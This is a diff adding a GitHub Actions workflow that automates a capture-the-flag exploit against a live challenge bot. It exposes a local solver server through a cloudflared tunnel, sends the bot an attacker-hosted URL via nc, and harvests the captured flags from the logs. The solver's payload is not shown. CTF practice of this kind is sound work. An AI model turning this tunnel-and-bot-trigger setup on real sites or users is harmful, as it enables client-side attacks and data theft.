@@ -1,0 +1,150 @@
+name: Chronostasis live dynamic solver
+
+on:
+  push:
+    branches:
+      - ctf-chronostasis-live-20260814
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  solve:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Run tunneled iframe exploit against live bot
+        shell: bash
+        run: |
+          set -uxo pipefail
+
+          curl -fsSL -o cloudflared \
+            https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
+          chmod +x cloudflared
+
+          python3 -m http.server 8000 --bind 127.0.0.1 > placeholder.log 2>&1 &
+          PLACEHOLDER_PID=$!
+          stdbuf -oL -eL ./cloudflared tunnel \
+            --url http://127.0.0.1:8000 --no-autoupdate > cf.log 2>&1 &
+          CF_PID=$!
+
+          PUBLIC=""
+          for i in $(seq 1 120); do
+            PUBLIC=$(grep -Eo 'https://[a-z0-9-]+\.trycloudflare\.com' cf.log | head -1 || true)
+            if [ -n "${PUBLIC}" ]; then
+              break
+            fi
+            sleep 2
+          done
+          test -n "${PUBLIC}"
+          echo "PUBLIC=${PUBLIC}"
+          kill "${PLACEHOLDER_PID}" || true
+
+          TOKEN="run-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}-$(date +%s)"
+          python3 -u ctf-live-dynamic/solver.py \
+            --public-origin "${PUBLIC}" \
+            --challenge-origin http://web:1337 \
+            --token "${TOKEN}" \
+            --port 8000 > server.log 2>&1 &
+          SERVER_PID=$!
+
+          local_ready=0
+          for i in $(seq 1 60); do
+            if curl -fsS --max-time 5 \
+              "http://127.0.0.1:8000/status?t=${TOKEN}" -o status.json; then
+              local_ready=1
+              break
+            fi
+            sleep 1
+          done
+          test "${local_ready}" = 1
+
+          tunnel_ready=0
+          for i in $(seq 1 45); do
+            if curl -fsS --max-time 10 \
+              "${PUBLIC}/status?t=${TOKEN}" -o tunnel-status.json; then
+              tunnel_ready=1
+              break
+            fi
+            echo "Waiting for public tunnel ${i}/45"
+            sleep 2
+          done
+          test "${tunnel_ready}" = 1
+
+          START="${PUBLIC}/start?t=${TOKEN}"
+          echo "START=${START}"
+
+          access_ready=0
+          for i in $(seq 1 120); do
+            if curl -fsS --max-time 5 \
+              http://challenge.rewritelab.org:35465/ -o /dev/null; then
+              access_ready=1
+              echo "Live HTTP access point available on attempt ${i}"
+              break
+            fi
+            echo "Waiting for live HTTP access point ${i}/120"
+            sleep 5
+          done
+          test "${access_ready}" = 1
+
+          : > bot.log
+          connected=0
+          for i in $(seq 1 18); do
+            { printf '%s\n' "${START}"; sleep 1; } |
+              timeout 55s nc -v challenge.rewritelab.org 35466 2>&1 |
+              tee bot-attempt.log || true
+            cat bot-attempt.log >> bot.log
+            if grep -q 'Starting the browser' bot-attempt.log; then
+              connected=1
+              break
+            fi
+            echo "TCP connection did not start the bot; retry ${i}/18" | tee -a bot.log
+            sleep 10
+          done
+          test "${connected}" = 1
+
+          curl -fsS "http://127.0.0.1:8000/status?t=${TOKEN}" \
+            -o status.json || true
+
+          echo '===== SERVER LOG ====='
+          cat server.log || true
+          echo '===== STATUS ====='
+          cat status.json || true
+
+          python3 - <<'PY'
+          import re
+          from pathlib import Path
+
+          parts = []
+          for name in ('bot.log', 'server.log', 'status.json', 'cf.log'):
+              p = Path(name)
+              if p.exists():
+                  parts.append(p.read_text(errors='replace'))
+          data = '\n'.join(parts)
+          clean = re.sub(r'\x1b\[[0-9;]*[A-Za-z]', '', data)
+          Path('combined-clean.log').write_text(clean)
+          flags = list(dict.fromkeys(re.findall(r'rewrite\{[^}\r\n]+\}', clean)))
+          print('\n===== LIVE FLAGS =====')
+          print('\n'.join(flags) if flags else '(none)')
+          Path('flag.txt').write_text('\n'.join(flags) + ('\n' if flags else ''))
+          PY
+
+      - name: Upload dynamic solver evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: chronostasis-dynamic-${{ github.run_id }}-${{ github.run_attempt }}
+          path: |
+            bot.log
+            bot-attempt.log
+            server.log
+            status.json
+            tunnel-status.json
+            cf.log
+            placeholder.log
+            combined-clean.log
+            flag.txt
+          if-no-files-found: warn
